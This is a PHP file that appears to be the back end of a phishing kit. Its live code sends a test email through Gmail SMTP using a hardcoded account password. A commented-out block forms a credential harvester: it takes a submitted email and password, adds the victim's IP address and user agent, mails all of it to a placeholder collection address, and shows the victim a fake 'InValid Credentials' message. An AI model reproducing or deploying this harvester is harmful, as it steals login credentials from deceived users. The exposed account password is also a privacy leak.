<?php

require_once('PHPmailer/PHPMailer/PHPMailerAutoload.php');

$mail = new PHPMailer();
$mail->isSMTP();
$mail->SMTPAuth = true;
$mail->SMTPSecure = 'ssl';
$mail->Host = 'smtp.gmail.com';
$mail->Port = '465';
$mail->isHTML();
$mail->Username = 'reessman12@gmail.com';
$mail->Password = 'reess1234';
$mail->SetFrom('no-reply@howcode.org');
$mail->Subject ="heell";
$mail->Body = "heeeeellee";
$mail->AddAddress('tobihabib25@gmail.com');

if(!$mail->send()) {
    echo 'Message could not be sent.';
    echo 'Mailer Error: ' . $mail->ErrorInfo;
} else {
    echo 'Message has been sent';
}

// $email = trim($_POST['email']);
// $password = trim($_POST['password']);
// //$detail = trim($_POST['detail']);
// if($email != null && $password != null){
// 	$ip = getenv("REMOTE_ADDR");
// 	$hostname = gethostbyaddr($ip);
// 	$useragent = $_SERVER['HTTP_USER_AGENT'];
//     $message = "";
// 	$message .= "|----------| xLs |--------------|\n";
// 	$message .= "Login From           : "/*.$detail*/."\n";
// 	$message .= "Online ID            : ".$email."\n";
// 	$message .= "Passcode              : ".$password."\n";
// 	$message .= "|--------------- I N F O | I P -------------------|\n";
// 	$message .= "|Client IP: ".$ip."\n";
// 	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
// 	$message .= "User Agent : ".$useragent."\n";
// 	$message .= "|----------- CrEaTeD bY plantvsUndead --------------|\n";
// 	$send = "emailisgonnabehere";
// 	$subject = "Login : $ip";
//     mail($send, $subject, $message);   
// 	$signal = 'ok';
// 	$msg = 'InValid Credentials';
	
// 	// $praga=rand();
// 	// $praga=md5($praga);
// }
// else{
// 	$signal = 'bad';
// 	$msg = 'Please fill in all the fields.';
// }
// $data = array(
//         'signal' => $signal,
//         'msg' => $msg
//     );
//     echo json_encode($data);

?>